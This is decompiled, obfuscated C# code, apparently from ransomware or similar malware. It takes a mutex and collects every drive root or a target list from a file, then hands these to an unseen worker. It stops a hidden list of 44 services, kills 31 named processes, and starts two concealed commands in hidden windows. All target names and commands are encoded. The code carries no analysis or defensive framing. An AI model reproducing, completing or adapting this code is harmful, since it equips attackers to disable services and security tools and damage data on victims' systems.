using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.ServiceProcess;
using System.Threading;
using _003CPrivateImplementationDetails_003E_007B18A11B1C_002D3AA7_002D4357_002DAAD9_002DCC83BB5216E3_007D;
using MOISHE.Core;

namespace A;

internal class B
{
	[Serializable]
	[CompilerGenerated]
	private sealed class A
	{
		public static readonly A A = new A();

		public static ThreadStart A;

		public static ThreadStart a;

		internal void A()
		{
			b.a();
		}

		internal void a()
		{
			b.A();
		}
	}

	private static int A(string string_0, string[] string_1)
	{
		int result = -1;
		if (string_1 != null && string_1.Length != 0)
		{
			for (int i = 0; i < string_1.Length; i++)
			{
				if (string_1[i].Equals(string_0))
				{
					return i;
				}
			}
		}
		return result;
	}

	public static void A(string[] args)
	{
		Mutex mutex = null;
		bool flag = false;
		try
		{
			mutex = new Mutex(initiallyOwned: true, Class0.aI());
			flag = true;
			List<string> list = new List<string>();
			if (args != null && args.Length != 0)
			{
				try
				{
					IEnumerable<string> enumerable = File.ReadAllLines(args[0]);
					foreach (string item in enumerable)
					{
						if (!string.IsNullOrEmpty(item))
						{
							list.Add(item);
						}
					}
				}
				catch
				{
				}
			}
			else
			{
				foreach (DirectoryInfo item2 in FileSystem.EnumerateRoots())
				{
					list.Add(item2.FullName);
				}
			}
			AbstractWorker.ExecuteOnce(delegate
			{
				b.a();
			});
			AbstractWorker.ExecuteOnce(delegate
			{
				b.A();
			});
			new a(list).A();
		}
		catch
		{
		}
		finally
		{
			if (flag)
			{
				mutex?.Dispose();
			}
		}
		Process process = new Process();
		new Process();
		process.StartInfo.FileName = Class0.ai();
		process.StartInfo.Arguments = Class0.aJ();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
		Process process2 = new Process();
		process2.StartInfo.FileName = Class0.aj();
		process2.StartInfo.Arguments = Class0.aK();
		process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process2.Start();
	}
}
internal class b
{
	[CompilerGenerated]
	private sealed class A
	{
		public string A;

		internal bool A(ServiceController serviceController_0)
		{
			return serviceController_0.get_ServiceName() == this.A;
		}
	}

	private static string[] m_A = new string[44]
	{
		Class0.aT(),
		Class0.at(),
		Class0.aU(),
		Class0.au(),
		Class0.aV(),
		Class0.av(),
		Class0.aW(),
		Class0.aw(),
		Class0.aX(),
		Class0.ax(),
		Class0.aY(),
		Class0.ay(),
		Class0.aZ(),
		Class0.az(),
		Class0.BA(),
		Class0.Ba(),
		Class0.BB(),
		Class0.Bb(),
		Class0.BC(),
		Class0.Bc(),
		Class0.BD(),
		Class0.Bd(),
		Class0.BE(),
		Class0.Be(),
		Class0.BF(),
		Class0.av(),
		Class0.Bf(),
		Class0.BG(),
		Class0.Bg(),
		Class0.BH(),
		Class0.Bh(),
		Class0.aW(),
		Class0.BI(),
		Class0.Bi(),
		Class0.BJ(),
		Class0.Bj(),
		Class0.BK(),
		Class0.Bk(),
		Class0.BL(),
		Class0.Bl(),
		Class0.BM(),
		Class0.Bm(),
		Class0.BN(),
		Class0.Bn()
	};

	private static string[] m_a = new string[31]
	{
		Class0.BO(),
		Class0.Bo(),
		Class0.BP(),
		Class0.Bp(),
		Class0.BQ(),
		Class0.Bq(),
		Class0.BR(),
		Class0.Br(),
		Class0.BS(),
		Class0.Bs(),
		Class0.BT(),
		Class0.Bt(),
		Class0.BU(),
		Class0.Bu(),
		Class0.BV(),
		Class0.Bv(),
		Class0.BW(),
		Class0.Bw(),
		Class0.BX(),
		Class0.Bx(),
		Class0.BY(),
		Class0.By(),
		Class0.BZ(),
		Class0.Bz(),
		Class0.bA(),
		Class0.ba(),
		Class0.bB(),
		Class0.bb(),
		Class0.bC(),
		Class0.bc(),
		Class0.bD()
	};

	public static void A(string string_0)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Invalid comparison between Unknown and I4
		ServiceController val = ((IEnumerable<ServiceController>)ServiceController.GetServices()).FirstOrDefault((Func<ServiceController, bool>)((ServiceController serviceController_0) => serviceController_0.get_ServiceName() == string_0));
		if (val == null || (int)val.get_Status() != 4)
		{
			return;
		}
		try
		{
			val.Stop();
			val.WaitForStatus((ServiceControllerStatus)1);
		}
		catch (InvalidOperationException)
		{
		}
	}

	public static void A()
	{
		string[] array = b.m_A;
		foreach (string string_ in array)
		{
			try
			{
				A(string_);
			}
			catch
			{
			}
		}
	}

	public static void a(string string_0)
	{
		try
		{
			int num = string_0.LastIndexOf(Class0.i());
			string processName = string_0;
			if (num > 0)
			{
				processName = string_0.Substring(0, num);
			}
			Process[] processesByName = Process.GetProcessesByName(processName);
			foreach (Process process in processesByName)
			{
				try
				{
					process.Kill();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public static void a()
	{
		string[] array = b.m_a;
		foreach (string string_ in array)
		{
			try
			{
				a(string_);
			}
			catch
			{
			}
		}
	}
}
